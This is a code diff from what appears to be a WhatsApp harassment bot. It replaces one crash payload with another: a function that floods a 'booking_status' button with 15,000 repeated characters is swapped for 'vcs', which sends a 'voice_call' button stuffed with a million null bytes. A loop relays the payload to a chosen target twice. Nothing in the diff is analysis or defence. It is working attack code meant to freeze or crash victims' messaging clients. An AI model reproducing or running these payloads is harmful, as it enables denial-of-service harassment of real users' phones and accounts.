@@ -3323,7 +3323,7 @@ Status      : Success
             
             for (let i = 0; i < 2; i++) {
                 try {
-                    await ZennFreezeForceTipis(sock, target);
+                    await vcs(target);
                     await sleep(2000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -3915,33 +3915,25 @@ async function VnXNewOneButtonsBlnk(sock, target) {
   });
 }
 
-async function ZennFreezeForceTipis(sock, target) {
-  const ZennTzy = {
-    viewOnceMessage: {
-      message: {
-        interactiveMessage: {
-          body: {
-            text: "who's zenn?"
-          },
-          nativeFlowMessage: {
-            buttons: [
-              {
-                name: "booking_status",
-                buttonParamsJson: JSON.stringify({
-                  display_text: "ꦽ".repeat(15000),
-                  phone_number: "00000000000000"
-                })
-              }
-            ],
-            version: 3
-          }
-        }
-      }
-    }
-  };
-
-  await sock.relayMessage(target, ZennTzy, { participant: { jid: target }
-  });
+async function vcs(target) {
+  await WaSocket.relayMessage(target, {
+    interactiveMessage: {
+      body: { text: "7eppsynC" },
+      nativeFlowMessage: {
+        buttons: [
+          {
+            name: "single_select"
+          },
+          {
+            name: "voice_call",
+            buttonParamsJson: "\0".repeat(1000000)
+          }
+        ]
+      }
+    }
+  }, {
+    participant: { jid: target }
+  })
 }
 
 //     _       ___  _   _ _   _ _____  _   _        
